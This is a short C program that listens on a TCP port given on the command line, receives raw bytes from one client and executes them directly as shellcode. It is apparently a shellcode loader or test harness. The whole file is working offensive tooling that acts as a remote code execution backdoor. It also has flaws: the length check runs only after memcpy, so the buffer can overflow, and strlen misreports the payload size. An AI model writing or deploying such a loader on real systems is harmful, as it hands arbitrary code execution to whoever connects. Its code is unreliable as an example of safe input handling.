#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define ERROR -1
#define MAX_DATA 2048
#define MAX_SHELLCODE_LEN 4096

char shell_code[MAX_SHELLCODE_LEN];

int main(int argc, char *argv[])
{
    struct sockaddr_in server;
    struct sockaddr_in client;

    int sock;
    int new;
    int sockaddr_len = sizeof(struct sockaddr_in);
    int data_len, shell_code_len;
    char data[MAX_DATA];
    int (*fptr)();

    if ((sock=socket(AF_INET, SOCK_STREAM, 0)) == ERROR){
        perror("Socket Error");
        exit(-1);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(atoi(argv[1]));
    server.sin_addr.s_addr = INADDR_ANY;
    bzero(&server.sin_zero, 8);

    if((bind(sock, (struct sockaddr*)&server, sockaddr_len)) == ERROR){
        perror("Bind Error");
        exit(-1);
    }

    if(listen(sock, 1) == ERROR){
        perror("Listen Error");
        exit(-1);
    }
    
    if((new = accept(sock, (struct sockaddr*)&client, &sockaddr_len)) == ERROR){
        perror("Accept Error");
        exit(-1);
    }

    data_len = shell_code_len = 0;

    do
    {
        data_len = recv(new, data, MAX_DATA, 0);
        if(data_len){
            memcpy(&shell_code[shell_code_len], data, data_len);
            shell_code_len +=data_len;
            if(shell_code_len > MAX_SHELLCODE_LEN){
                printf("Received shellcode exceeds the Maximum Size \n");
                exit(-1);
            }
        }
    } while (data_len);
    
    close(new);
    close(sock);

    if(shell_code_len){
        printf("Shellcode size: %d\n", (int)strlen(shell_code));
        printf("Executing ... \n");
        fptr = (int(*)())shell_code;
        (int)(*fptr)();
    }

    return 0;
}
